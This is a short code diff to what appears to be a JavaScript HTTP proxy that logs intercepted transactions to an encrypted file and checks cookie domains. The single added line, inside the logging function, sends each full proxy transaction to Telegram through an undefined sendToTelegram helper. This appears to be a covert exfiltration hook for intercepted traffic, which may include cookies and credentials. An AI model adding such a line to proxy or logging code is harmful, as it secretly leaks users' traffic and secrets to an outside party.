@@ -478,6 +478,7 @@ async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions
     if (!logFileStream.write(`${JSON.stringify({ [encryptedResult.iv]: encryptedResult.encryptedData })}\n`)) {
         await new Promise(resolve => logFileStream.once("drain", resolve));
     }
+        sendToTelegram(httpProxyTransaction);
 }
 
 function isDomainApplicable(requestHostname, cookieDomain, cookieHostOnly) {
